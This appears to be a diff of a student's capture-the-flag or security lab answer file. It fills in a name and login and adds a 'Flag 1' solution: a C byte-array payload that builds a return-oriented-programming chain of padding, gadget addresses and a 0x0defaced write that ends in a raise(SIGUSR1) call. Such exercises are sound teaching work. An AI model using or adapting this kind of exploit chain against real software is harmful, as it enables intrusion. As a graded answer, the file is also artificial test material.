@@ -10,12 +10,29 @@
 
 --[ 0x0 whoami
 
-Name:		Brown Hat
-Login:		xyzzy
+Name:		Ed Bielawa
+Login:		ebielawa
 Hostname:	cslab##
 
 --[ 0x1 Flag 1
 
+unsigned char payload[] =
+	/* ------------------------------------	*/
+	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+	"XXXXXXXXXXXX"
+	/* ------------------------------------	*/
+	/* FIXME */
+	/* ------------------------------------	*/
+	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
+	"\x08\xb0\x88\x0c"		// Address of magic
+	"\x1e\x90\x04\x08"		// Address of pop ebx gadget (0x0804901e)
+	"\xed\xac\xef\x0d"		// 0x0defaced (in little endian)
+	"\x48\x71\x88\x0c"		// Address of mov ebx to [edx] (0x0c887148)
+	"\x30\x90\x04\x08"		// Address of raise in .plt (0x08049030)
+	"\xef\xbe\xad\xde"		// DEADBEEF (extra return address)
+	"\x0a\x00\x00\x00";		// SIGUSR1
+	/* ------------------------------------	*/
 
 --[ 0x2 Flag 2
 
